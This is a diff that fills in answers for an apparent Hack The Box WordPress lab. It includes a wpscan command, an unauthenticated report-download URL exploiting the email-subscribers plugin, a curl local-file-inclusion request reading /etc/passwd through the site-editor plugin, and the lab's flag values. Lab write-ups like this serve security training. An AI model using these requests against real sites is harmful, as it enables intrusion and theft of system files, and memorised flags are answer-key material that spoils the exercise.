@@ -40,7 +40,10 @@ Identify the only non-admin WordPress user. (Format: \<first-name> \<last-name>)
 
 Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.
 
-* 
+*  Run command " wpscan --enumerate ap --url http:\//blog.inlanefreight.local/ ", this will scan for the vulnerable plugins the site has, we will use one in particular called " email-suscribers "
+* Search on google for " CVE email-suscribers wordpress " and you will find one vulnerability in particular coded " CVE 2019-19985 " which allows for an authenticated file download
+* for you to run the vulnerability, either go to a browser and type the whole link as " http:\//blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all " or do a curl, this will download a list of " subscribed users file " which you can open to get the flag
+* HTB{unauTh_d0wn10ad!}
 
 What is the version number of the plugin vulnerable to an LFI?
 
@@ -49,8 +52,10 @@ What is the version number of the plugin vulnerable to an LFI?
 
 Use the LFI to identify a system user whose name starts with the letter "f".
 
-* 
+* Search on google for " LFI Wordpress plugin ", it should intruct you on using the LFI by running the command " curl http:\//blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd ", it will give you a list of users in the webpage server, then just look for the one that starts with " f "
+* frank.mclane
 
 Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.
 
 * 
+* HTB{w0rdPr355_4SS3ssm3n7}
